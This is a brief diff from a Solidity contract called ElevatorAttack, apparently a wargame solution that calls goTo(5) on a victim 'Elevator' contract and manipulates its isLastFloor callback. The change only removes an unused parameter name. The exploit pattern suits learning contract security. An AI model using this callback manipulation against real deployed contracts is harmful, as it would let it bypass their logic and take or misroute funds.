@@ -19,7 +19,7 @@ contract ElevatorAttack is Ownable {
         IElevator(victimContract).goTo(5);
     }
 
-    function isLastFloor(uint256 number) external returns (uint256) {
+    function isLastFloor(uint256) external returns (uint256) {
         if (msg.sender != victimContract) revert();
 
         if (!entered) {
